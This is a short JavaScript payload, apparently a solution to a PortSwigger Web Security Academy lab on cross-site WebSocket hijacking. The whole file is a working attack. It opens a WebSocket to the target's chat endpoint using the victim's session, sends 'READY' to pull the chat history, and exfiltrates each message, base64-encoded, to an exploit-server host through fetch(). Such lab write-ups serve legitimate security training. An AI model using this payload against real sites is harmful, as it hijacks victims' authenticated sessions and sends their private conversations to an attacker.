// The payload below is meant to solve the following lab:
// https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab


//<script>
var ws = new WebSocket('wss://[LAB_SUB_DOMAIN].web-security-academy.net/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://[EXPLOIT_SUB_DOMAIN].exploit-server.net/exploit?chats=' + btoa(event.data));
};
//</script>
